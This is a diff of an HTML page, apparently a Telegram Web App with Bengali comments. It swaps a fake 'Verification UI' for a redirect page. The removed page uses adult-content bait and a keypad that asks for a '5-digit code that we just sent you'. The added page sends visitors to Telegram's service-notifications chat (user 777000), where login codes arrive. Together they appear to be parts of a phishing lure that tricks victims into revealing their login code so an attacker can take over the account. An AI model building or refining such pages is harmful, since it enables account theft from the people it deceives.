@@ -1,74 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
+    <title>Redirecting...</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification UI</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body { margin: 0; padding: 0; font-family: sans-serif; background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg'); background-size: cover; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; overflow: hidden; }
-        .card { background: rgba(255, 255, 255, 0.25); backdrop-filter: blur(25px); border-radius: 35px; padding: 30px 20px; width: 320px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.3); }
-        .instruction { background: white; color: #222; padding: 12px; border-radius: 12px; margin-bottom: 25px; font-size: 14px; font-weight: bold; }
-        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 25px; }
-        .otp-inputs input { width: 48px; height: 60px; background: rgba(255, 255, 255, 0.3); border: 2px solid rgba(255, 255, 255, 0.5); border-radius: 12px; text-align: center; font-size: 26px; color: #000; font-weight: bold; outline: none; }
-        .get-code-btn { background: #34a853; border: none; width: 100%; padding: 18px; border-radius: 12px; color: white; font-weight: bold; font-size: 17px; cursor: pointer; margin-bottom: 25px; box-shadow: 0 4px 0 #288a42; }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-        .key { background: #4caf50; padding: 15px; border-radius: 10px; font-size: 22px; font-weight: bold; cursor: pointer; user-select: none; }
-        .key:active { background: #388e3c; }
-    </style>
 </head>
 <body>
-    <div class="card">
-        <div class="instruction">Enter the 5-digit code that we just sent you!</div>
-        <div class="otp-inputs" id="otp-container">
-            <input type="text" maxlength="1" readonly>
-            <input type="text" maxlength="1" readonly>
-            <input type="text" maxlength="1" readonly>
-            <input type="text" maxlength="1" readonly>
-            <input type="text" maxlength="1" readonly>
-        </div>
-        <button class="get-code-btn" onclick="openServiceChat()">🔞 GET VIEW CODE 🔞</button>
-        <div class="keypad">
-            <div class="key" onclick="pressKey('1')">1</div>
-            <div class="key" onclick="pressKey('2')">2</div>
-            <div class="key" onclick="pressKey('3')">3</div>
-            <div class="key" onclick="pressKey('4')">4</div>
-            <div class="key" onclick="pressKey('5')">5</div>
-            <div class="key" onclick="pressKey('6')">6</div>
-            <div class="key" onclick="pressKey('7')">7</div>
-            <div class="key" onclick="pressKey('8')">8</div>
-            <div class="key" onclick="pressKey('9')">9</div>
-            <div class="key"></div>
-            <div class="key" onclick="pressKey('0')">0</div>
-            <div class="key" onclick="pressKey('back')">✖️</div>
-        </div>
-    </div>
-
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+        window.onload = function() {
+            // মেথড ১: সরাসরি ইউজার আইডি দিয়ে চ্যাট ওপেন করা
+            window.location.href = "tg://openmessage?user_id=777000";
 
-        let inputs = document.querySelectorAll('#otp-container input');
-        let currentIdx = 0;
-
-        function pressKey(key) {
-            if (key === 'back') {
-                if (currentIdx >= 0) {
-                    if (inputs[currentIdx].value === "" && currentIdx > 0) currentIdx--;
-                    inputs[currentIdx].value = "";
-                }
-            } else if (currentIdx < inputs.length) {
-                inputs[currentIdx].value = key;
-                if (currentIdx < inputs.length - 1) currentIdx++;
-            }
-        }
-
-        function openServiceChat() {
-            // এটি আপনার তৈরি করা go.html ফাইলটিকে এক্সটারনাল ব্রাউজারে ওপেন করবে
-            const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
-            tg.openLink(redirectUrl);
-        }
+        };
     </script>
+    <div style="text-align: center; margin-top: 100px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
+        <h2 style="color: #333;">Connecting to Service Notifications...</h2>
+        <p style="color: #666;">If the chat doesn't open automatically, use the buttons below:</p>
+        <br>
+        <a href="tg://openmessage?user_id=777000" style="display: inline-block; padding: 10px 20px; background: #0088cc; color: white; text-decoration: none; border-radius: 5px;">Method 1</a>
+        <br><br>
+        <a href="tg://openmessage?chat_id=777000" style="display: inline-block; padding: 10px 20px; background: #34a853; color: white; text-decoration: none; border-radius: 5px;">Method 2</a>
+    </div>
 </body>
 </html>
